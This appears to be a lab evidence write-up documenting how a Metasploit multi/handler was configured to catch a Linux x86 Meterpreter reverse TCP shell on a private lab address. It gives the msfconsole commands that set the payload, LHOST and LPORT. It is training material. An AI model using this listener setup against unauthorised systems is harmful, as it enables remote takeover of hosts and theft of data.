# Evidence 02 — Metasploit Multi/Handler

## Objective

The objective of this step was to configure the Metasploit `exploit/multi/handler` module to receive a compatible Meterpreter Reverse TCP connection from the authorized laboratory environment.

## Module

    exploit/multi/handler

## Payload

The handler was configured to use the same payload that was generated during the previous step:

    linux/x86/meterpreter/reverse_tcp

## Configuration

The following values were configured:

    PAYLOAD = linux/x86/meterpreter/reverse_tcp
    LHOST = 192.168.164.128
    LPORT = 4444

The `LHOST` and `LPORT` values were configured to match the values used during payload generation.

## Commands Used

    use exploit/multi/handler

    set PAYLOAD linux/x86/meterpreter/reverse_tcp

    set LHOST 192.168.164.128

    set LPORT 4444

    show options

## Configuration Verification

The `show options` command was used to verify that the handler configuration was correct before starting the listener.

The important values were:

    PAYLOAD = linux/x86/meterpreter/reverse_tcp
    LHOST = 192.168.164.128
    LPORT = 4444

## Starting the Handler

The handler was started using:

    run

The handler then waited for a compatible Reverse TCP payload connection.

## Expected Listener State

A correctly configured handler waits for the incoming connection from the authorized laboratory payload.

The listener remains active until a compatible connection is received or the listener is stopped.

## Security Relevance

A handler is an important component of Metasploit's session-management workflow.

The payload and handler must use compatible configuration values.

For a Reverse TCP payload:

    Target
       |
       | TCP connection
       ↓
    Multi/Handler

The target initiates the connection toward the configured listener.

## Evidence Screenshot

The following screenshot provides evidence of the Metasploit Multi/Handler configuration.

![Multi Handler Configuration](../screenshots/02-multi-handler.png)

## Result

The Metasploit Multi/Handler was successfully configured with a compatible Linux x86 Meterpreter Reverse TCP payload.

The handler was configured to listen on:

    192.168.164.128:4444

## Conclusion

The Multi/Handler phase demonstrated how Metasploit establishes a listener capable of receiving a compatible Reverse TCP payload.

The next phase of the practical demonstrates the Reverse TCP connection in the authorized laboratory environment.

## Authorization

This activity was performed exclusively within an authorized cybersecurity laboratory environment for educational and security-training purposes.

No unauthorized systems were targeted.
